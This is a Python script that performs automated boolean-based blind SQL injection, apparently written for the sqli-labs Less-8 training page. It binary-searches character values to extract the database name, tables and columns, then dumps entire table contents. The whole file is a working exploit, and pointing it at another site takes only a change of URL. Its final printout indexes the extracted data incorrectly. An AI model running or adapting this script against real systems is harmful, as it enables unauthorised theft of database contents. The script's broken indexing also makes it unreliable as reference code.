import requests

url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"

selectdatabase = "select database()"
select_parenthese = "(%s)"
select_table_sum = "select count(*) from information_schema.tables where table_schema = '%s'"
select_table = "select table_name from information_schema.tables where table_schema = '%s' limit %d,1"
select_column_sum = "select count(*) from information_schema.columns where table_schema = '%s' and table_name = '%s'"
select_column = "select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1"
select_dump_sum = "select count(*) from %s"
select_dump = "select %s from %s limit %d,1"

datastr = "(select database())"
userstr = "(select user())"
ascstr = "' and ascii(substr((%s),%d,1))>=%d"
lenstr = "' and length(%s)>%d"
note = "-- -"

def get_statue(url):
    r = requests.get(url)
    return 'You are in' in r.text

def get_name(inject_url, payload, select_content, length, note):
    name = ""
    for pos in range(1, length + 1):
        max_val = 127
        min_val = 32
        mid_val = (max_val + min_val) // 2
        while min_val < max_val - 1:
            final_url = inject_url + payload % (select_content, pos, mid_val) + note
            print(final_url)
            if get_statue(final_url):
                min_val = mid_val
            else:
                max_val = mid_val
            mid_val = (max_val + min_val) // 2
        name += chr(mid_val)
    return name

def get_length(inject_url, select_sentence):
    for x in range(1, 100):  # Increased range to cover more potential lengths
        final_url = inject_url + lenstr % (select_sentence, x) + note
        print(final_url)
        if not get_statue(final_url):
            return x

def get_select_info(select_sentence):
    length = get_length(url, select_sentence)
    return get_name(url, ascstr, select_sentence, length, note)

db_name = get_select_info(datastr)
table_sum = get_select_info(select_parenthese % (select_table_sum % db_name))

all_tables = []
for line in range(int(table_sum)):
    all_tables.append(get_select_info(select_parenthese % (select_table % (db_name, line))))

print(all_tables)

while True:
    column_table = input("Which table do you want to dump? ")
    if column_table not in all_tables:
        print(f"Table {column_table} does not exist.\n")
    else:
        break

column_sum = get_select_info(select_parenthese % (select_column_sum % (db_name, column_table)))
all_columns = []
for row in range(int(column_sum)):
    all_columns.append(get_select_info(select_parenthese % (select_column % (db_name, column_table, row))))

print(all_columns)

while True:
    choice = input("Dump it? (y/n) ")
    if choice.lower() == 'n':
        exit(0)
    else:
        break

dump_sum = get_select_info(select_parenthese % (select_dump_sum % column_table))
data = []
for col in all_columns:
    for data_line in range(int(dump_sum)):
        data.append(get_select_info(select_parenthese % (select_dump % (col, column_table, data_line))))

for col in all_columns:
    print(col, end="\t")
print()

for rw in range(int(dump_sum)):
    for ln in range(int(column_sum)):
        print(data[ln * int(column_sum) + rw], end="\t")
    print()

print(data)
